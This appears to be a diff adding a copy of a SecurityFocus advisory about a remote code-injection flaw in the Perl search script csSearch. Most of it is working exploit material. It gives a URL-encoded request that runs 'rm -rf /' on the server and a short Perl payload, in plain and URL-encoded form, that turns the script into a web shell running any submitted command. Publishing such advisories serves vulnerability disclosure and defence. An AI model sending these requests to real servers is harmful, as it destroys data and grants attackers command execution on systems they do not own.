@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/4368/info
+
+csSearch is a website search script, written in Perl. It will run on most Unix and Linux variants, as well as Microsoft operating systems.
+
+csSearch is prone to an issue which may enable an attacker to execute Perl code with the privileges of the webserver process.
+
+For exploitation to be successful, the attacker must pass properly URL encoded Perl code in CGI parameters via a web request. For example:
+
+http://host/cgi-bin/csSearch.cgi?command=savesetup&setup=PERL_CODE_HERE 
+
+Configuration data is saved with the following URL.
+Note that any perl code would need to be URL encoded.
+
+csSearch.cgi?command=savesetup&setup=PERL_CODE_HERE
+
+For example, the classic "rm -rf /" example would be
+as follows:
+
+csSearch.cgi?command=savesetup&setup=`rm%20-rf%20/`
+
+Here's something a little more interesting, less than
+300 bytes of code that turns csSearch into a remote
+web shell of sorts.
+
+*ShowSearchForm = *Login = sub {
+print "<form method=post action=csSearch.cgi>Enter
+Command (eg: ls -l)<br>";
+print "<input type=text name=cmd size=99> ";
+print "<input type=submit value=Execute><hr><xmp>";
+$in{'cmd'} && print `$in{'cmd'} 2>&1`;
+exit;
+};
+
+URL Encoded as:
+
+csSearch.cgi?command=savesetup&setup=*ShowSearchForm%3D*Login%3Dsub{print"<form+method%3Dpost+action%3DcsSearch.cgi>Enter+Comm
+and+(example:+ls+-l)<br><input+type%3Dtext+name%3Dcmd+size%3D99>+<input+type%3Dsubmit+value%3DExecute><hr><xmp>";$in{'cmd'}%26
+%26print`$in{'cmd'}+2>%261`;exit;}; 
